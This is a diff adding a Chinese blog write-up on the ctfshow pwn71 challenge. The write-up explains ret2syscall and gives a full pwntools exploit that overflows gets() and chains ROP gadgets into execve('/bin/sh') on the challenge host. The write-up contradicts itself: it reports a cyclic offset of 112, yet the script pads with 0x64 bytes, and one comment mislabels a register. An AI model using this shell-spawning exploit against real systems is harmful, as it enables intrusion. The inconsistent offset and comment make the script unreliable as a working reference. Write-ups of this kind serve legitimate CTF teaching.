@@ -550,4 +550,117 @@
         <tag>CTF - PWN - 网络安全</tag>
       </tags>
   </entry>
+  <entry>
+    <title>ctfshow pwn入门 pwn71</title>
+    <url>/2025/11/24/ctfshow-pwn%E5%85%A5%E9%97%A8-pwn71/</url>
+    <content><![CDATA[<h2 id="pwn71"><a href="#pwn71" class="headerlink" title="pwn71"></a>pwn71</h2><p><a href="https://ctf.show/challenges#pwn71-4081">ctf.show pwn71</a></p>
+<span id="more"></span>
+
+<h4 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h4><ul>
+<li><a href="#jump1">题目</a></li>
+<li><a href="#jump2">预计时间</a></li>
+<li><a href="#jump3">题目分析及截图</a></li>
+</ul>
+<hr>
+<h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a><a id="jump1">题目</a></h4><img src="/2025/11/24/ctfshow-pwn%E5%85%A5%E9%97%A8-pwn71/1.png" class="" title="This is an image">
+
+<h4 id="预计时间"><a href="#预计时间" class="headerlink" title="预计时间"></a><a id="jump2">预计时间</a></h4><p>2h</p>
+<h4 id="题目分析及截图"><a href="#题目分析及截图" class="headerlink" title="题目分析及截图"></a><a id="jump3">题目分析及截图</a></h4><p>题目描述是 <strong>ret2syscall</strong></p>
+<p><strong>ret2syscall原理：</strong></p>
+<p>利用 <strong>系统调用</strong>去进行攻击，核心思想是：<strong>控制寄存器+ 跳转syscall</strong></p>
+<p>在栈溢出时，我们能控制栈，因此可以构造 <strong>ROP链</strong></p>
+<p>**32-bit ret2syscall：**eax &#x2F; ebx &#x2F; ecx &#x2F; edx</p>
+<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">eax = <span class="string">&quot;系统调用号&quot;</span></span><br><span class="line">ebx = <span class="string">&quot;参数1&quot;</span></span><br><span class="line">ecx = <span class="string">&quot;参数2&quot;</span></span><br><span class="line">edx = <span class="string">&quot;参数3&quot;</span></span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure>
+
+<p>**64-bit ret2syscall：**rax &#x2F; rdi &#x2F; rsi &#x2F; rdx</p>
+<p>一句话概括：利用栈溢出构造ROP链执行系统调用</p>
+<hr>
+<p>知道原理之后我们就可以去写题了</p>
+<p>先<code>checksec ./pwn</code>看一下保护机制</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yyh@yyh:~/pwn71$ checksec ./pwn</span><br><span class="line">[*] <span class="string">&#x27;/home/yyh/pwn71/pwn&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stripped:   No</span><br><span class="line">    Debuginfo:  Yes</span><br></pre></td></tr></table></figure>
+
+<p>发现 <strong>NX</strong> 开启，即不可执行，我们可以使用 <strong>syscall</strong> 进行绕过，因为syscall是利用<strong>gadget</strong> 来进行系统调用的</p>
+<p>我们先使用Ida看一下程序的代码<br><strong>main函数</strong></p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [esp+1Ch] [ebp-64h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;===============CTFshow--PWN===============&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Try to use ret2syscall!&quot;</span>);</span><br><span class="line">  gets(&amp;v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>很明显的栈溢出<code> gets(&amp;v4);</code></p>
+<p>我们先看需要 <strong>填充</strong> 的偏移是多少</p>
+<ol>
+<li><p>我第一次是在ida中看的,<code>int v4; // [esp+1Ch] [ebp-64h] BYREF</code></p>
+<p>那么offset &#x3D; 0x64 + 4吗?其实不是的，我是写好exp之后发现打不通，才发现这个offset是不对的</p>
+</li>
+<li><p>我们可以使用<code>cyclic</code>来看偏移，这是更准确的方法</p>
+<p><strong>具体操作：</strong></p>
+<ol>
+<li><p>gdb .&#x2F;pwn</p>
+</li>
+<li><p>b main</p>
+</li>
+<li><p>r</p>
+</li>
+<li><p>cyclic 200</p>
+</li>
+<li><p>复制下来这串字符之后</p>
+</li>
+<li><p>Ctrl + d退出调试</p>
+</li>
+<li><p>gdb .&#x2F;pwn</p>
+</li>
+<li><p>r</p>
+</li>
+<li><p>输入这串字符</p>
+</li>
+<li><p>得到溢出地址</p>
+</li>
+<li><p>cyclic -l 0x62616164</p>
+<img src="/2025/11/24/ctfshow-pwn%E5%85%A5%E9%97%A8-pwn71/5.png" class="" title="This is an image"></li>
+</ol>
+<p>之后我们就得到了偏移地址是<strong>112</strong></p>
+</li>
+</ol>
+<blockquote>
+<p>我们怎么构造ROP链？</p>
+</blockquote>
+<p>首先<code>execve</code>的系统调用号是<strong>11 (0xb)</strong></p>
+<p>那么如果要执行 <strong>“&#x2F;bin&#x2F;sh”</strong> 的话</p>
+<ul>
+<li><code>eax = 11 (0xb)</code>   -&gt;   <code>execve</code>的系统编号</li>
+<li><code>ebx = &quot;/bin/sh&quot;</code>   -&gt;   文件名</li>
+<li><code>ecx = 0</code></li>
+<li><code>edx = 0</code></li>
+<li><code>int 0x80</code></li>
+</ul>
+<p>Q：<code>int 80</code> 的意思是什么？<br>A：触发中断 0x80，让 CPU 从用户态切换到内核态执行系统调用。</p>
+<p>​	当然如果我们需要执行这个命令的话就需要寄存器传参，就需要找 <code>gadget</code> 的地址</p>
+<p>可以使用<code>ROPgadget</code>命令来找我们所需要的地址</p>
+<ol>
+<li><code>ROPgadget --binary pwn --only &quot;pop|ret&quot; | grep eax</code></li>
+</ol>
+<img src="/2025/11/24/ctfshow-pwn%E5%85%A5%E9%97%A8-pwn71/2.png" class="" title="This is an image">
+
+<ol start="2">
+<li><code>ROPgadget --binary pwn --only &quot;pop|ret&quot; | grep ebx</code></li>
+</ol>
+<img src="/2025/11/24/ctfshow-pwn%E5%85%A5%E9%97%A8-pwn71/3.png" class="" title="This is an image">
+
+<ol start="3">
+<li><code>ROPgadget --binary pwn --only &quot;pop|ret&quot; | grep ecx</code></li>
+</ol>
+<img src="/2025/11/24/ctfshow-pwn%E5%85%A5%E9%97%A8-pwn71/4.png" class="" title="This is an image">
+
+<p>到<code>ecx</code>发现并没有<code>pop ecx ; ret</code></p>
+<p>但是我们发现了<code>0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret</code> </p>
+<p>这个gadget同样可以使用，并且<strong>它正好按顺序帮我设置了 execve 所需的三个寄存器</strong></p>
+<blockquote>
+<p>exp如下</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>, <span class="number">28108</span>)</span><br><span class="line">pop_eax = <span class="number">0x080bb196</span></span><br><span class="line">pop_edx_ecx_ebx = <span class="number">0x0806eb90</span></span><br><span class="line">int_0x80 = <span class="number">0x08049421</span></span><br><span class="line">binsh = <span class="number">0x080be408</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x64</span></span><br><span class="line"><span class="comment">#eax = 11</span></span><br><span class="line">payload += p32(pop_eax)</span><br><span class="line">payload += p32(<span class="number">11</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#edx = 0, ecx = 0, ecx = &quot;/bin/sh&quot;</span></span><br><span class="line">payload += p32(pop_edx_ecx_ebx)</span><br><span class="line">payload += p32(<span class="number">0</span>) <span class="comment">#edx</span></span><br><span class="line">payload += p32(<span class="number">0</span>) <span class="comment">#ecx</span></span><br><span class="line">payload += p32(binsh) <span class="comment">#ebx = &quot;/bin/sh&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#int 0x80</span></span><br><span class="line">payload += p32(int_0x80)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>这道题到此就结束了</p>
+<p>加油！</p>
+]]></content>
+      <tags>
+        <tag>CTF - PWN - 网络安全</tag>
+      </tags>
+  </entry>
 </search>
